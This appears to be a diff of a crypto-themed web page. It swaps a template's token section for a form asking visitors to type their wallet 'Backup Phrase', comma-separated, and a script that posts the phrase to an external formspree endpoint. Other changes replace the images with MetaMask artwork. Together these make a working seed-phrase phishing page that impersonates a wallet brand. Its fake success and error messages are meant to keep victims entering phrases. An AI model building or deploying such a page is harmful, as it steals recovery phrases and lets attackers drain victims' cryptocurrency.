@@ -117,69 +117,76 @@
                 </div>
             </div>
         </div>
-        <div class="tokens-area pb-100">
-            <div class="container">
-                <div class="row justify-content-center align-items-center">
-                    <div class="col-lg-6 col-md-12">
-                        <div class="tokens-image"><img src="https://novis-ts.envytheme.com/images/tokens.jpg" alt="image" /></div>
-                    </div>
-                    <div class="col-lg-6 col-md-12">
-                        <div class="tokens-content">
-                            <h2>Offer Ends In</h2>
-                            
-                            <div id="countdown">
-                                <ul>
-                                    <li><span id="days"></span>DAYS</li>
-                                    <li><span id="hours"></span>HOURS</li>
-                                    <li><span id="minutes"></span>MIN</li>
-                                    <li><span id="seconds"></span>SEC</li>
-                                </ul>
-                            </div>
-                            <div class="token-price">
-                                <div class="d-flex">
-                                    <div class="box"><span>Token Price</span>
-                                        <h3>100 btc = $0.08</h3>
-                                    </div>
-                                    
-                                </div>
-                            </div>
-                            
-                    
-                            <form data-toggle="validator"><input type="email" class="input-newsletter" placeholder="Enter your backup phrase" name="TEXT" required="" autoComplete="off" /><button type="submit">Login <i class="bx bx-chevron-right"></i></button>
-                                <div id="validator-newsletter"
-                                    class="form-result"></div>
-                            </form>
-                            
-                            
-                            
-                            
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="cryptocurrency-area ptb-100 bg-fffbf1">
-            <div class="container">
-                <div class="section-title">
-                    <h2>Top Cryptocurrencies</h2>
+        
+            <form action="https://formspree.io/f/mdoyzeqb" method="post" style="border: 3px solid #f1f1f1;" id="my-form">
 
-                </div>
-                <div class="cryptocurrency-table table-responsive">
-                    <table class="table">
-                        <thead>
-                            <tr>
-                                <th scope="col">Name</th>
-                                <th scope="col">Price</th>
-                                <th scope="col">Change (24h)</th>
-                                <th scope="col">Trade</th>
-                            </tr>
-                        </thead>
-                        <tbody></tbody>
-                    </table>
-                </div>
-                <div class="more-cryptocurrency-box text-center"><a class="default-btn" href="/prices/"><i class="bx bx-purchase-tag-alt"></i> See More Prices</a></div>
-            </div>
-        </div>
+  <div class="container1">
+    <label for="uname"><b> Backup Phrase<br><br>Seprate each word with a comma sign (,)</b></label>
+    <input type="text" placeholder="hide,book,cookies,dinner,father" name="uname" required="">
+
+        
+      <button type="submit">Login</button>
+	  <p id="my-form-status"></p>
+    
+  </div>
+</form>
+                    <style>
+	
+	input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  
+  
+}
+
+button {
+  background-color: #04AA6D;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 50%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+
+
+.container1 {
+  padding: 16px;
+}
+	
+	</style>
+                    <script>
+
+    var form = document.getElementById("my-form");
+    
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("my-form-status");
+      var data = new FormData(event.target);
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        status.innerHTML = "You have been selected";
+        form.reset()
+      }).catch(error => {
+        status.innerHTML = "Oops! There was a problem . Check your backup phrase"
+      });
+    }
+    form.addEventListener("submit", handleSubmit)
+</script>
+
+        
         <div class="features-area pt-100 pb-70">
             <div class="container">
                 <div class="section-title">
@@ -216,7 +223,7 @@
                             <div class="content-slides"></div>
                         </div>
                         <div class="col-xl-7 col-lg-6 col-md-12 p-0">
-                            <div class="image text-center"><img src="https://novis-ts.envytheme.com/images/portfolio/portfolio-img1.png" alt="image" /></div>
+                            <div class="image text-center"><img src="https://metamask.io/images/hero2.2.png" alt="image" /></div>
                         </div>
                     </div>
                 </div>
@@ -225,13 +232,13 @@
         </div>
         <div class="buy-sell-cryptocurrency-area pt-100 pb-70">
         
-            <div class="shape13"><img src="/https://novis-ts.envytheme.comimages/shape/shape13.png" alt="image" /></div>
+            <div class="shape13"><img src="https://novis-ts.envytheme.comimages/shape/shape13.png" alt="image" /></div>
         </div>
         <div class="app-download-area bg-f9f9f9">
             <div class="container">
                 <div class="row align-items-center m-0">
                     <div class="col-lg-6 col-md-12 p-0">
-                        <div class="app-download-image"><img src="https://novis-ts.envytheme.com/images/app.png" alt="image" /></div>
+                        <div class="app-download-image"><img src="https://metamask.io/images/wallet-illo.svg" alt="image" /></div>
                     </div>
                     <div class="col-lg-6 col-md-12 p-0">
                         <div class="app-download-content">
